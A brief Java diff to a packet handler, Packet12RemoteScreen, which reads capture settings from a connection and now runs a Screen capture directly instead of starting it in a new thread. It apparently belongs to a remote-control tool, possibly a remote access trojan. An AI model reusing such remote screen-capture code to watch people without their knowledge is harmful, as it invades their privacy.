@@ -21,7 +21,8 @@ public class Packet12RemoteScreen extends AbstractIncomingPacket {
 		int quality = Connection.readInt();
 		int monitor = Connection.readInt();
 		
-		new Thread(new Screen(repeat, size, quality, monitor)).start();
+		//new Thread(new Screen(repeat, size, quality, monitor)).run();
+		new Screen(repeat, size, quality, monitor).run();
 	}
 
 }
